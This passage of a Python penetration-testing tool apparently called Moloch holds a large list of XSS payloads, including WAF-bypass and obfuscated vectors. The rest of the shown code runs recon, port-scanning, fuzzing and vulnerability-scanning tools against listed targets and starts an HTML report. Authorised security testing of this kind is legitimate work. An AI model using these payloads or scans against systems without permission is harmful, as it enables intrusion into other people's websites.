        advanced_xss = [
            # Polyglot XSS payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\">`><marquee><img src=x onerror=confirm(1)></marquee>\" onfocus=JaVaSCript:alert(1) autofocus",
            "<img src=x onerror=alert('XSS') onerror=alert('XSS') onerror=alert('XSS')>",
            # Context-specific XSS
            # HTML context
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            # Attribute context
            "' onmouseover='alert(1)",
            "\" onmouseover=\"alert(1)",
            "' autofocus onfocus='alert(1)",
            "\" autofocus onfocus=\"alert(1)",
            # JavaScript context
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "';alert(String.fromCharCode(88,83,83));//",
            "\";alert(String.fromCharCode(88,83,83));//",
            # CSS context
            "</style><script>alert('XSS')</script>",
            "expression(alert('XSS'))",
            "url(javascript:alert('XSS'))",
            "@import'javascript:alert(\"XSS\")'",
            # URL context
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            # Event handlers
            "onload=alert('XSS')",
            "onerror=alert('XSS')",
            "onmouseover=alert('XSS')",
            "onfocus=alert('XSS')",
            "onclick=alert('XSS')",
            "onsubmit=alert('XSS')",
            "onchange=alert('XSS')",
            "onkeydown=alert('XSS')",
            "onkeyup=alert('XSS')",
            "onkeypress=alert('XSS')",
            # WAF bypass techniques
            "<scr<script>ipt>alert('XSS')</script>",
            "<scrİpt>alert('XSS')</scrİpt>",
            "<script>alert('XSS')</script>",
            "<ſcript>alert('XSS')</ſcript>",
            "<script>al\\u0065rt('XSS')</script>",
            "<script>al\\x65rt('XSS')</script>",
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>window['ale'+'rt']('XSS')</script>",
            "<script>window[/ale/.source+/rt/.source]('XSS')</script>",
            "<script>Function('ale'+'rt(1)')();rlert('XSS')</script>",
            "<script>[].constructor.constructor('alert(1)')();</script>",
            "<script>top[8680439..toString(30)](1)</script>",
            "<script>(alert)(1)</script>",
            "<script>a=alert,a(1)</script>",
            "<script>[alert][0](1)</script>",
            "<script>alert.call(null,1)</script>",
            "<script>alert.apply(null,[1])</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>setInterval('alert(1)',0)</script>",
            "<script>requestAnimationFrame(alert.bind(null,1))</script>",
            "<script>Promise.resolve().then(function(){alert(1)})</script>",
            "<script>throw onerror=alert,1</script>",
            "<script>with(document)write('<img src=1 onerror=alert(1)>')</script>",
            # HTML5 vectors
            "<audio src=x onerror=alert(1)>",
            "<video><source onerror=\"alert(1)\">",
            "<input type=image src=x onerror=alert(1)>",
            "<isindex action=javascript:alert(1) type=image>",
            "<object data=\"javascript:alert(1)\">",
            "<embed src=\"javascript:alert(1)\">",
            "<applet code=\"javascript:alert(1)\">",
            "<form><button formaction=javascript&colon;alert(1)>CLICKME",
            "<form><input formaction=javascript&colon;alert(1) type=submit value=CLICKME>",
            "<form><textarea formaction=javascript&colon;alert(1)>CLICKME",
            "<form><select formaction=javascript&colon;alert(1)><option>CLICKME",
            "<form><keygen formaction=javascript&colon;alert(1)>",
            "<frameset onload=alert(1)>",
            # SVG vectors
            "<svg/onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><script href=data:,alert(1) />",
            "<svg><script xlink:href=data:,alert(1) />",
            "<svg><use xlink:href=data:,<svg id='x' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><script>alert(1)</script></svg>#x />",
            "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
            "<svg><title><script>alert(1)</script></title></svg>",
            "<svg><desc><script>alert(1)</script></desc></svg>",
            "<svg><metadata><script>alert(1)</script></metadata></svg>",
            "<svg><text><script>alert(1)</script></text></svg>",
            "<svg><textPath><script>alert(1)</script></textPath></svg>",
            "<svg><tspan><script>alert(1)</script></tspan></svg>",
            "<svg><defs><script>alert(1)</script></defs></svg>",
            "<svg><g><script>alert(1)</script></g></svg>",
            "<svg><symbol><script>alert(1)</script></symbol></svg>",
            "<svg><marker><script>alert(1)</script></marker></svg>",
            "<svg><clipPath><script>alert(1)</script></clipPath></svg>",
            "<svg><mask><script>alert(1)</script></mask></svg>",
            "<svg><pattern><script>alert(1)</script></pattern></svg>",
            "<svg><image><script>alert(1)</script></image></svg>",
            "<svg><switch><script>alert(1)</script></switch></svg>",
            "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
            # MathML vectors
            "<math><script>alert(1)</script></math>",
            "<math><mtext><script>alert(1)</script></mtext></math>",
            "<math><mi><script>alert(1)</script></mi></math>",
            "<math><mo><script>alert(1)</script></mo></math>",
            "<math><mn><script>alert(1)</script></mn></math>",
            "<math><ms><script>alert(1)</script></ms></math>",
            "<math><mspace><script>alert(1)</script></mspace></math>",
            "<math><mrow><script>alert(1)</script></mrow></math>",
            "<math><mfrac><script>alert(1)</script></mfrac></math>",
            "<math><msqrt><script>alert(1)</script></msqrt></math>",
            "<math><mroot><script>alert(1)</script></mroot></math>",
            "<math><mstyle><script>alert(1)</script></mstyle></math>",
            "<math><merror><script>alert(1)</script></merror></math>",
            "<math><mpadded><script>alert(1)</script></mpadded></math>",
            "<math><mphantom><script>alert(1)</script></mphantom></math>",
            "<math><menclose><script>alert(1)</script></menclose></math>",
            "<math><msub><script>alert(1)</script></msub></math>",
            "<math><msup><script>alert(1)</script></msup></math>",
            "<math><msubsup><script>alert(1)</script></msubsup></math>",
            "<math><munder><script>alert(1)</script></munder></math>",
            "<math><mover><script>alert(1)</script></mover></math>",
            "<math><munderover><script>alert(1)</script></munderover></math>",
            "<math><mmultiscripts><script>alert(1)</script></mmultiscripts></math>",
            "<math><mtable><script>alert(1)</script></mtable></math>",
            "<math><mtr><script>alert(1)</script></mtr></math>",
            "<math><mtd><script>alert(1)</script></mtd></math>",
            "<math><maligngroup><script>alert(1)</script></maligngroup></math>",
            "<math><malignmark><script>alert(1)</script></malignmark></math>",
            "<math><maction><script>alert(1)</script></maction></math>",
            # Template literals and ES6
            "<script>`${alert(1)}`</script>",
            "<script>alert`1`</script>",
            "<script>eval`alert\\x281\\x29`</script>",
            "<script>setTimeout`alert\\x281\\x29`</script>",
            "<script>setInterval`alert\\x281\\x29`</script>",
            "<script>Function`x${alert(1)}x`</script>",
            "<script>new Function`x${alert(1)}x`</script>",
            "<script>(alert)`1`</script>",
            "<script>(alert).call`${{toString:alert,valueOf:()=>1}}`</script>",
            # RegExp and other creative vectors
            "<script>alert(RegExp.prototype.test.call(/a/,alert(1)))</script>",
            "<script>Array.prototype.toString.call([alert,1])</script>",
            "<script>String.prototype.replace.call('x',/x/,alert)</script>",
            "<script>Function.prototype.call.call(alert,null,1)</script>",
            "<script>Reflect.apply(alert,null,[1])</script>",
            "<script>Reflect.construct(alert,[1])</script>",
            # WebAssembly
            "<script>fetch('data:application/wasm;base64,AGFzbQEAAAA=').then(r=>r.arrayBuffer()).then(b=>WebAssembly.instantiate(b)).then(m=>alert(1))</script>",
            # Service Worker
            "<script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>",
            # Import maps
            "<script type=\"importmap\">{\"imports\":{\"alert\":\"data:text/javascript,alert(1)\"}}</script><script type=\"module\">import\"alert\"</script>",
            # CSS injection
            "<style>@import'javascript:alert(1)'</style>",
            "<style>body{background:url('javascript:alert(1)')}</style>",
            "<style>body{-webkit-binding:url('javascript:alert(1)')}</style>",
            "<style>body{behavior:url('javascript:alert(1)')}</style>",
            "<link rel=stylesheet href='javascript:alert(1)'>",
            # Meta refresh
            "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
            "<meta http-equiv=refresh content=0;url=data:text/html,<script>alert(1)</script>>",
            # Base href
            "<base href='javascript:alert(1)//'><a href=x>click</a>",
            "<base href='data:text/html,<script>alert(1)</script>'><iframe src=x>",
            # Form action
            "<form action='javascript:alert(1)'><input type=submit></form>",
            "<form><button formaction='javascript:alert(1)'>click</button></form>",
            # Mixed content
            "<div onclick='&#97;lert(1)'>click</div>",
            "<div onclick='\\u0061lert(1)'>click</div>",
            "<div onclick='eval(\"\\x61lert(1)\")'>click</div>",
            "<div onclick='Function(\"\\x61lert(1)\")()'>click</div>",
        ]
        write_lines(advanced_xss_file, advanced_xss)
        logger.info(f"Created advanced XSS payloads: {advanced_xss_file}")
    
    logger.info("Enhanced wordlists and payloads creation complete.")

def create_targets_file():
    """Create a default targets.txt file if it doesn't exist."""
    if not TARGETS_FILE.exists():
        try:
            TARGETS_FILE.write_text("# Add your targets here, one per line\n# example.com\n# test.example.org\n")
            logger.info(f"Created default targets file: {TARGETS_FILE}")
        except Exception as e:
            logger.error(f"Failed to create targets file: {e}")

def initialize_environment():
    """Perform all setup tasks: directories, wordlists, targets, dependencies."""
    logger.info("=== Initializing Moloch Environment ===")
    create_directories()
    create_default_wordlists() # Now just ensures dirs exist
    create_targets_file()
    config = load_config()
    check_and_install_dependencies(config)
    logger.info("=== Moloch Environment Initialization Complete ===")

# --- Configuration Management ---
def load_config() -> Dict[str, Any]:
    """Load configuration from file or create default."""
    if CFG_FILE.exists():
        try:
            with open(CFG_FILE, 'r') as f:
                loaded_config = json.load(f)
                # Merge with default to ensure all keys are present
                merged_config = DEFAULT_CONFIG.copy()
                for key, value in loaded_config.items():
                    if isinstance(value, dict) and key in merged_config and isinstance(merged_config[key], dict):
                        merged_config[key].update(value)
                    else:
                        merged_config[key] = value
                return merged_config
        except Exception as e:
            logger.error(f"Error loading config: {e}. Using defaults.")
    # Create default config if not found or error
    save_config(DEFAULT_CONFIG)
    return DEFAULT_CONFIG

def save_config(config: Dict[str, Any]):
    """Save configuration to file."""
    try:
        with open(CFG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        logger.info("Configuration saved.")
    except Exception as e:
        logger.error(f"Error saving config: {e}")

# --- Utility Functions ---
def sanitize_filename(name: str) -> str:
    """Sanitize string for use as a filename."""
    return re.sub(r'[<>:"/\\|?*\x00-\x1F]', '_', name)

def new_run() -> Path:
    """Create a new run directory."""
    run_id = f"{APP.lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}"
    run_dir = RUNS_DIR / run_id
    run_dir.mkdir(parents=True, exist_ok=True)
    (run_dir / "subdomains").mkdir(exist_ok=True)
    (run_dir / "hosts").mkdir(exist_ok=True)
    (run_dir / "vulns").mkdir(exist_ok=True)
    (run_dir / "fuzzing").mkdir(exist_ok=True)
    (run_dir / "crawling").mkdir(exist_ok=True)
    (run_dir / "report").mkdir(exist_ok=True)
    logger.info(f"New run directory created: {run_dir}")
    return run_dir

def read_lines(file_path: Path) -> List[str]:
    """Read lines from a file."""
    if not file_path.exists():
        return []
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Error reading {file_path}: {e}")
        return []

def write_lines(file_path: Path, lines: List[str]):
    """Write lines to a file."""
    try:
        # Ensure parent directory exists
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with open(file_path, 'w') as f:
            for line in lines:
                f.write(f"{line}\n")
    except Exception as e:
        logger.error(f"Error writing to {file_path}: {e}")

def safe_execute(func, *args, default=None, error_msg="Operation failed", **kwargs):
    """Safely execute a function with error handling."""
    try:
        return func(*args, **kwargs)
    except Exception as e:
        logger.error(f"{error_msg}: {e}")
        return default

# --- Core Tool Execution Logic ---
def execute_tool(tool_name: str, args: List[str], output_file: Optional[Path] = None, run_dir: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> bool:
    """Execute a security tool with configuration and error handling."""
    config = load_config()
    tool_config = config.get("tools", {}).get(tool_name, {})

    if not tool_config.get("enabled", False):
        logger.info(f"Tool {tool_name} is disabled in config.")
        return False

    tool_path = which(tool_name)
    if not tool_path:
        logger.warning(f"Tool {tool_name} not found in PATH. Skipping.")
        return False

    cmd = [tool_path] + tool_config.get("flags", []) + args
    timeout = config.get("performance", {}).get("tool_timeout", 600)

    # Special handling for tools requiring specific setups
    tool_env = os.environ.copy()
    if env:
        tool_env.update(env)

    if tool_name == "chaos" and config.get("auth", {}).get("chaos_api_key"):
        tool_env["CHAOS_KEY"] = config.get("auth", {}).get("chaos_api_key")
    elif tool_name == "nuclei" and config.get("auth", {}).get("nuclei_interactsh"):
        cmd.extend(["-interactsh-url", config.get("auth", {}).get("nuclei_interactsh")])
    elif tool_name == "dalfox" and "-b" in cmd:
        # Ensure a blind XSS server is configured or warn
        if "your.xss.hunter.domain" in cmd:
            logger.warning("Dalfox configured with default blind XSS domain. Please configure your own in moloch.cfg.json.")

    logger.info(f"Running {tool_name}: {' '.join(cmd)}")
    
    try:
        result = run_cmd(cmd, timeout=timeout, cwd=str(run_dir) if run_dir else None, env=tool_env)
        success = result.returncode == 0
        
        if output_file and result.stdout:
            # Ensure parent directory exists
            output_file.parent.mkdir(parents=True, exist_ok=True)
            write_lines(output_file, result.stdout.strip().split('\n'))
            logger.info(f"Output written to {output_file}")
        elif output_file and not result.stdout:
            logger.warning(f"No output generated for {tool_name}, but output file was requested.")
        
        if not success:
            logger.warning(f"Tool {tool_name} returned non-zero exit code: {result.returncode}")
            if result.stderr:
                logger.debug(f"Tool {tool_name} stderr: {result.stderr}")
        
        return success
    except Exception as e:
        logger.error(f"Exception while running {tool_name}: {e}")
        return False

# --- Reconnaissance Modules ---
def run_subdomain_discovery(target: str, output_dir: Path, config: Dict[str, Any]):
    """Run subdomain discovery using multiple tools."""
    logger.info(f"[RECON] Starting subdomain discovery for {target}")
    subdomains: Set[str] = set()

    tools_to_run = [
        ("subfinder", [target], output_dir / "subfinder.txt"),
        ("assetfinder", [target], output_dir / "assetfinder.txt"),
        ("findomain", [target], output_dir / "findomain.txt"),
    ]

    # Add Amass if configured
    amass_flags = config.get("tools", {}).get("amass", {}).get("flags", [])
    tools_to_run.append(("amass", amass_flags + [target], output_dir / "amass.txt"))

    # Add Chaos if API key is present and tool is enabled
    chaos_key = config.get("auth", {}).get("chaos_api_key")
    if chaos_key and config.get("tools", {}).get("chaos", {}).get("enabled", False):
        tools_to_run.append(("chaos", [target], output_dir / "chaos.txt"))

    max_workers = min(config.get("performance", {}).get("max_workers", 5), len(tools_to_run))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_tool = {executor.submit(execute_tool, tool, args, output, output_dir): (tool, output) for tool, args, output in tools_to_run}
        for future in as_completed(future_to_tool):
            tool, output_file = future_to_tool[future]
            try:
                success = future.result()
                if success and output_file.exists():
                    lines = read_lines(output_file)
                    initial_count = len(subdomains)
                    subdomains.update(line.strip().lower() for line in lines if line.strip())
                    logger.debug(f"[RECON] {tool} added {len(subdomains) - initial_count} unique subdomains.")
                else:
                    logger.warning(f"[RECON] {tool} did not produce results or failed.")
            except Exception as e:
                logger.error(f"[RECON] Error running {tool}: {e}")

    # Deduplication and saving
    unique_subdomains = sorted(list(subdomains))
    final_subdomain_file = output_dir / f"subdomains_{sanitize_filename(target)}.txt"
    write_lines(final_subdomain_file, unique_subdomains)
    logger.info(f"[RECON] Subdomain discovery complete. Total unique subdomains: {len(unique_subdomains)}")
    return unique_subdomains

def run_dns_resolution(subdomain_file: Path, output_file: Path, config: Dict[str, Any]):
    """Resolve subdomains to IPs."""
    logger.info("[RECON] Resolving subdomains to IPs...")
    if not subdomain_file.exists():
        logger.warning(f"Subdomain file {subdomain_file} does not exist.")
        return False

    # Using dnsx for resolution
    success = execute_tool("dnsx", ["-l", str(subdomain_file), "-o", str(output_file)], output_file=output_file)
    if success:
        logger.info(f"[RECON] DNS resolution complete. Results in {output_file}")
        return True
    else:
        logger.error("[RECON] DNS resolution failed.")
        return False

def run_http_probing(resolved_file: Path, output_file: Path, config: Dict[str, Any]):
    """Probe hosts for HTTP/HTTPS."""
    logger.info("[RECON] Probing hosts for HTTP/HTTPS...")
    if not resolved_file.exists():
        logger.warning(f"Resolved host file {resolved_file} does not exist.")
        return False

    success = execute_tool("httpx", ["-l", str(resolved_file), "-o", str(output_file)], output_file=output_file)
    if success:
        logger.info(f"[RECON] HTTP probing complete. Results in {output_file}")
        return True
    else:
        logger.error("[RECON] HTTP probing failed.")
        return False

# --- Scanning Modules ---
def run_vulnerability_scan(host_file: Path, output_dir: Path, config: Dict[str, Any]):
    """Run vulnerability scan using Nuclei."""
    logger.info("[SCAN] Starting vulnerability scan with Nuclei...")
    if not host_file.exists():
        logger.warning(f"Host file {host_file} does not exist.")
        return False

    nuclei_output = output_dir / "nuclei_results.json"
    # Basic nuclei scan
    success = execute_tool("nuclei", ["-l", str(host_file), "-json", "-o", str(nuclei_output)], output_file=nuclei_output, run_dir=output_dir)

    if success:
        logger.info(f"[SCAN] Nuclei scan complete. Results in {nuclei_output}")
        return True
    else:
        logger.error("[SCAN] Nuclei scan failed.")
        return False

def run_port_scan(target: str, output_file: Path, config: Dict[str, Any]):
    """Run port scan using Nmap or Naabu."""
    logger.info(f"[SCAN] Starting port scan for {target}...")

    # Prefer Nmap, fallback to Naabu
    nmap_flags = config.get("tools", {}).get("nmap", {}).get("flags", [])
    naabu_flags = config.get("tools", {}).get("naabu", {}).get("flags", [])

    if which("nmap"):
        # Nmap outputs to multiple files, so we specify a prefix
        output_prefix = str(output_file).replace('.txt', '')
        success = execute_tool("nmap", nmap_flags + ["-oA", output_prefix, target])
        if success:
            logger.info(f"[SCAN] Nmap scan complete. Results in {output_prefix}.{{nmap,xml,gnmap}}")
            return True
        else:
            logger.error("[SCAN] Nmap scan failed.")
            return False
    elif which("naabu"):
        success = execute_tool("naabu", naabu_flags + ["-host", target, "-o", str(output_file)], output_file=output_file)
        if success:
            logger.info(f"[SCAN] Naabu scan complete. Results in {output_file}")
            return True
        else:
            logger.error("[SCAN] Naabu scan failed.")
            return False
    else:
        logger.error("[SCAN] Neither Nmap nor Naabu found for port scanning.")
        return False

def run_ssl_scan(target: str, output_file: Path, config: Dict[str, Any]):
    """Run SSL/TLS scan using testssl.sh."""
    logger.info(f"[SCAN] Starting SSL/TLS scan for {target}...")
    if not target.startswith(("http://", "https://")):
        https_target = f"https://{target}"
    else:
        https_target = target

    # testssl.sh typically outputs to a file directly using --file, but we use -o
    success = execute_tool("testssl.sh", config.get("tools", {}).get("testssl", {}).get("flags", []) + ["-o", str(output_file), https_target]) # Assuming testssl.sh is in PATH after install
    if success:
        logger.info(f"[SCAN] SSL/TLS scan initiated. Results will be in {output_file}")
        return True
    else:
        logger.error("[SCAN] SSL/TLS scan failed to start.")
        return False

# --- Web Application Testing Modules ---
def run_crawling(target: str, output_file: Path, config: Dict[str, Any]):
    """Crawl a target using Katana, Gau, Waybackurls."""
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    logger.info(f"[WEB] Starting crawling for {target}...")

    combined_urls: Set[str] = set()
    tools_to_run = []

    if config.get("tools", {}).get("katana", {}).get("enabled"):
        katana_out = output_file.with_name(f"{output_file.stem}_katana.txt")
        tools_to_run.append(("katana", ["-u", target, "-o", str(katana_out)], katana_out))
    if config.get("tools", {}).get("gau", {}).get("enabled"):
        gau_out = output_file.with_name(f"{output_file.stem}_gau.txt")
        tools_to_run.append(("gau", [target], gau_out)) # gau writes to stdout, we capture it
    if config.get("tools", {}).get("waybackurls", {}).get("enabled"):
        wayback_out = output_file.with_name(f"{output_file.stem}_wayback.txt")
        tools_to_run.append(("waybackurls", [target], wayback_out)) # waybackurls writes to stdout

    # Limit concurrent crawling to avoid overwhelming
    max_workers = min(3, len(tools_to_run))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_tool = {executor.submit(execute_tool, tool, args, output): (tool, output) for tool, args, output in tools_to_run}
        for future in as_completed(future_to_tool):
            tool, output_file_tool = future_to_tool[future]
            try:
                success = future.result()
                if success and output_file_tool.exists():
                    lines = read_lines(output_file_tool)
                    initial_count = len(combined_urls)
                    combined_urls.update(line.strip() for line in lines if line.strip())
                    logger.debug(f"[WEB] {tool} added {len(combined_urls) - initial_count} unique URLs.")
                elif success: # Tool ran, but output was to stdout (gau, waybackurls)
                     # This is tricky as execute_tool doesn't capture stdout if no output_file is given for these tools.
                     # A better approach would be to modify execute_tool or capture stdout directly here.
                     # For now, we assume tools like gau/waybackurls write to the specified file if -o is used.
                     # If they write to stdout by default, this needs adjustment.
                     pass # Placeholder, logic needs refinement for stdout tools without -o
                else:
                    logger.warning(f"[WEB] {tool} did not produce results or failed.")
            except Exception as e:
                logger.error(f"[WEB] Error running {tool}: {e}")

    sorted_urls = sorted(list(combined_urls))
    write_lines(output_file, sorted_urls)
    logger.info(f"[WEB] Crawling complete. Combined results in {output_file}. Total URLs: {len(sorted_urls)}")
    return sorted_urls

def run_xss_scan(url_file: Path, output_file: Path, config: Dict[str, Any]):
    """Scan for XSS using Dalfox."""
    logger.info("[WEB] Starting XSS scan with Dalfox...")
    if not url_file.exists():
        logger.warning(f"URL file {url_file} does not exist.")
        return False

    success = execute_tool("dalfox", ["file", str(url_file), "-o", str(output_file)], output_file=output_file)
    if success:
        logger.info(f"[WEB] XSS scan complete. Results in {output_file}")
        return True
    else:
        logger.error("[WEB] XSS scan failed.")
        return False

# --- Fuzzing Modules ---
def run_directory_fuzzing(target: str, output_dir: Path, config: Dict[str, Any]):
    """Run directory fuzzing using FFuF or Gobuster."""
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    logger.info(f"[FUZZ] Starting directory fuzzing for {target}...")

    wordlist_name = config.get("wordlists", {}).get("fuzzing", "raft-medium-directories.txt")
    wordlist_path = WORDLISTS_DIR / wordlist_name if not Path(wordlist_name).is_absolute() else Path(wordlist_name)

    if not wordlist_path.exists():
        logger.error(f"[FUZZ] Wordlist {wordlist_path} not found.")
        return False

    # Prefer FFuF
    if which("ffuf") and config.get("tools", {}).get("ffuf", {}).get("enabled"):
        ffuf_out = output_dir / f"ffuf_{sanitize_filename(target)}.json" # Use JSON for structured output
        ffuf_cmd = ["-u", f"{target}/FUZZ", "-w", str(wordlist_path), "-of", "json", "-o", str(ffuf_out)]
        success = execute_tool("ffuf", ffuf_cmd, run_dir=output_dir)
        if success:
            logger.info(f"[FUZZ] FFuF fuzzing complete. Results in {ffuf_out}")
            return True
        else:
            logger.error("[FUZZ] FFuF fuzzing failed.")
            return False
    elif which("gobuster") and config.get("tools", {}).get("gobuster", {}).get("enabled"):
        gobuster_out = output_dir / f"gobuster_{sanitize_filename(target)}.txt"
        gobuster_cmd = config.get("tools", {}).get("gobuster", {}).get("flags", []) + ["-u", target, "-w", str(wordlist_path), "-o", str(gobuster_out)]
        success = execute_tool("gobuster", gobuster_cmd, output_file=gobuster_out)
        if success:
            logger.info(f"[FUZZ] Gobuster fuzzing complete. Results in {gobuster_out}")
            return True
        else:
            logger.error("[FUZZ] Gobuster fuzzing failed.")
            return False
    else:
        logger.error("[FUZZ] No fuzzing tool (FFuF or Gobuster) available or enabled.")
        return False

# --- Reporting ---
def filter_and_save_positive_results(run_dir: Path, config: Dict[str, Any]):
    """Filter and save positive/interesting results to a consolidated file."""
    logger.info("[REPORT] Filtering and saving positive results...")
    findings: Dict[str, List[Dict[str, Any]]] = {
        "subdomains": [],
        "live_hosts": [],
        "vulnerabilities": [],
        "xss": [],
        "fuzzing": [],
        "ssl_issues": [],
        "port_scans": [],
        "crawled_urls": [],
        "parameters": [],
    }

    # --- Subdomains ---
    subdomain_files = list(run_dir.glob("subdomains/subdomains_*.txt"))
    for sf in subdomain_files:
        lines = read_lines(sf)
        findings["subdomains"].extend([{"source_file": str(sf.relative_to(run_dir)), "finding": line} for line in lines])

    # --- Live Hosts (from httpx) ---
    live_host_files = list(run_dir.glob("hosts/live_*.txt"))
    for lf in live_host_files:
        lines = read_lines(lf)
        # Filter for HTTP 200 OK or interesting status codes
        interesting_lines = [line for line in lines if "[200]" in line or "[301]" in line or "[302]" in line or "[401]" in line or "[403]" in line or "[500]" in line]
        findings["live_hosts"].extend([{"source_file": str(lf.relative_to(run_dir)), "finding": line} for line in interesting_lines])

    # --- Vulnerabilities (from Nuclei) ---
    nuclei_result_files = list(run_dir.glob("vulns/nuclei_results.json"))
    for nf in nuclei_result_files:
        try:
            with open(nf, 'r') as f:
                for line in f:
                    if line.strip():
                        finding = json.loads(line)
                        # Only save findings with severity
                        if "info" in finding and "severity" in finding["info"]:
                             findings["vulnerabilities"].append({"source_file": str(nf.relative_to(run_dir)), "finding": finding})
        except Exception as e:
            logger.error(f"[REPORT] Error parsing Nuclei results {nf}: {e}")

    # --- XSS (from Dalfox) ---
    xss_result_files = list(run_dir.glob("crawling/xss_*.txt"))
    for xf in xss_result_files:
        lines = read_lines(xf)
        # Dalfox usually has [V] for vulnerable
        vulnerable_lines = [line for line in lines if "[V]" in line]
        findings["xss"].extend([{"source_file": str(xf.relative_to(run_dir)), "finding": line} for line in vulnerable_lines])

    # --- Fuzzing (from FFuF) ---
    ffuf_result_files = list(run_dir.glob("fuzzing/ffuf_*.json"))
    for ff in ffuf_result_files:
        try:
            with open(ff, 'r') as f:
                data = json.load(f)
                results = data.get("results", [])
                # Filter for interesting status codes
                interesting_results = [r for r in results if r.get("status") in [200, 201, 202, 204, 301, 302, 307, 308, 401, 403, 405, 500]]
                findings["fuzzing"].extend([{"source_file": str(ff.relative_to(run_dir)), "finding": r} for r in interesting_results])
        except Exception as e:
            logger.error(f"[REPORT] Error parsing FFuF results {ff}: {e}")

    # --- SSL Issues (from testssl.sh) ---
    ssl_result_files = list(run_dir.glob("vulns/ssl_*.json"))
    for sf in ssl_result_files:
        try:
            with open(sf, 'r') as f:
                data = json.load(f)
                # Look for findings with severity or flagged issues
                for section in data.get("scanResult", []):
                    for finding in section.get("vulnerabilities", []):
                        if finding.get("severity") in ["LOW", "MEDIUM", "HIGH", "CRITICAL"]:
                            findings["ssl_issues"].append({"source_file": str(sf.relative_to(run_dir)), "finding": finding})
                    for finding in section.get("ciphers", []):
                         if finding.get("strength") in ["WEAK", "INSECURE"]:
                            findings["ssl_issues"].append({"source_file": str(sf.relative_to(run_dir)), "finding": finding})
        except Exception as e:
            logger.error(f"[REPORT] Error parsing SSL results {sf}: {e}")

    # --- Port Scans ---
    # Nmap results (parse .nmap or .xml if needed, here we just list files)
    nmap_files = list(run_dir.glob("hosts/port_scan_*.nmap")) + list(run_dir.glob("hosts/port_scan_*.xml"))
    for nf in nmap_files:
        findings["port_scans"].append({"source_file": str(nf.relative_to(run_dir)), "finding": f"Nmap scan result file: {nf.name}"})
    # Naabu results
    naabu_files = list(run_dir.glob("hosts/port_scan_*.txt"))
    for nf in naabu_files:
        lines = read_lines(nf)
        findings["port_scans"].extend([{"source_file": str(nf.relative_to(run_dir)), "finding": line} for line in lines])

    # --- Crawled URLs ---
    crawled_url_files = list(run_dir.glob("crawling/urls_*.txt"))
    for cf in crawled_url_files:
        lines = read_lines(cf)
        findings["crawled_urls"].extend([{"source_file": str(cf.relative_to(run_dir)), "finding": line} for line in lines])

    # --- Parameters (from Arjun if integrated) ---
    # This would require parsing Arjun's output, similar to others.

    # --- Save Consolidated Findings ---
    consolidated_file = run_dir / "report" / config.get("output", {}).get("consolidated_findings_file", "moloch_findings.json")
    try:
        with open(consolidated_file, 'w') as f:
            json.dump(findings, f, indent=4)
        logger.info(f"[REPORT] Consolidated findings saved to {consolidated_file}")
    except Exception as e:
        logger.error(f"[REPORT] Failed to save consolidated findings: {e}")

    return findings


def generate_simple_report(run_dir: Path, config: Dict[str, Any]):
    """Generate a simple HTML report."""
    logger.info("[REPORT] Generating simple HTML report...")
    findings = filter_and_save_positive_results(run_dir, config) # Get filtered results
    report_dir = run_dir / "report"
    report_file = report_dir / "report.html"

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Moloch Report - {run_dir.name}</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #1e1e1e; color: #eee; }}
            .header {{ background: linear-gradient(135deg, #8B0000, #FF6347); padding: 25px; text-align: center; color: white; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }}
            .section {{ margin: 25px 0; padding: 20px; border: 1px solid #444; border-radius: 8px; background-color: #2d2d2d; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
            h1, h2, h3 {{ margin-top: 0; color: #FF6347; }}
            pre {{ background-color: #1c1c1c; padding: 15px; overflow-x: auto; white-space: pre-wrap; border-radius: 5px; border: 1px solid #333; }}
            a {{ color: #4682B4; text-decoration: none; }}
            a:hover {{ text-decoration: underline; }}
            .summary-item {{ display: inline-block; background: #333; padding: 8px 15px; margin: 5px; border-radius: 5px; }}
            .file-link {{ display: block; margin: 5px 0; }}
            .finding-count {{ font-weight: bold; color: #FFD700; }} /* Gold color for counts */
        </style>
    </head>
    <body>
        <div class="header">
            <h1>{BANNER.splitlines()[2].strip()}</h1>
            <p>Automated Penetration Test Report</p>
            <p>Run ID: {run_dir.name} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        <div class="section">
            <h2>Executive Summary</h2>
            <p>This report summarizes the findings of the automated scan performed by Moloch.</p>
